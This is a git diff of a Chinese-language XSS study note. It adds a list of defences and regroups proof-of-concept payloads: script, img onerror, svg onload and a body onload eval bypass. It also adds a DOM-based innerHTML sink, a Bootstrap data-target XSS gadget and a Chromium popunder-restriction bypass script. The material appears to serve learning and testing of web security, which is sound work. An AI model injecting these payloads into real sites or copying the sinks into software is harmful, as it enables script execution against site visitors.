@@ -16,8 +16,8 @@ Forum或者留言板中, 在文本中加入script. (前端可能用ajax讀取內
 *  [常見限制 and 對抗手勢](#常見限制-and-對抗手勢)  
 *  [正規表達式](#正規表達式)  
 *  [攻擊手勢](#攻擊手勢)  
-*  [DOM BASED XSS](#dom-based-xss)  
-*  [Cheatsheet](#cheatsheet)    
+*  [popunder彈窗手勢](#彈窗手勢)  
+*  [Cheatsheet](#cheatsheet)    
 *  [Reference](#reference)
 
 # XSS detection
@@ -76,6 +76,10 @@ preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET['hi'])   // 大�
 cript:
 alert(/1/);">
 ```
+* XSS filters  
+* WAF  
+* HTML Sanitizer  
+* CSP(Content-Security-Policy)
 
 # 正規表達式
 js中會用正規表達式來過濾危險字符  
@@ -87,31 +91,57 @@ js中會用正規表達式來過濾危險字符
 [Documentation](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#.E9.80.9A.E8.BF.87.E5.8F.82.E6.95.B0.E8.BF.9B.E8.A1.8C.E9.AB.98.E7.BA.A7.E6.90.9C.E7.B4.A2)
 
 # 攻擊手勢  
-* script  
+* 不同的`<tag>`做利用  
 ```js
+// script
 <script>a=prompt;a(1)</script>
-```
-* img  
-```js
+
+// img
 <img src=1 onmouseover=alert(1)>
 <img src=1 onerror=confirm(1)>
 <img src="javascript:alert(1);">
-```
-* svg  
-```js
+
+// svg
 <svg/onload=alert(1)>
-```
-* body  
-```js
+
+// body
 <body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29’;>   
 // 這種payload也可以繞過括號過濾
 ```
-
-# DOM based XSS
+* DOM based XSS  
 ```js
 <script>document.getElementById("contents").innerHTML=location.hash.substring(1);</script>
 // #之後的內容不會被傳送到server端
 ```
+* bootstrap data-* 屬性  
+```js
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+<button data-toggle="collapse" data-target="<img src=x onerror=alert(0)>">Test</button>
+
+// 關於這個漏洞的解釋issue中有一個評論很清楚
+<button data-toggle="collapse" data-target="<?=htmlspecialchars($_GET['x']);?>">Test</button>
+// 雖然有參數可控但是htmlspecialchar轉義，這本該是安全的，但是會在bootstrap環境下data-target的屬性中觸發
+```
+值得注意的是`data-target`本身不會造成xss漏洞，而是被帶到boostrap的環境下發揮效用的！  
+[XSS in data-target attribute #20184](https://github.com/twbs/bootstrap/issues/20184)  
+* Vue.js
+
+
+# 彈窗手勢
+現在大部分的瀏覽器都禁止未禁用戶允許的彈窗了  
+@MasatoKinugawa 發現一個bypass限制的技巧：  
+```js
+<script>
+onkeydown=function(){
+    window.open('//example.com/','_blank','a');
+}
+onkeypress=function(){
+    window.open('about:blank','_blank').close();
+}
+```
+以上效果可瀏覽 https://vulnerabledoma.in/popunder/keyevent.html  
+[Popunder restriction bypass with keydown and keypress event](https://bugs.chromium.org/p/chromium/issues/detail?id=836841)
 
 # Cheatsheet
 ```php
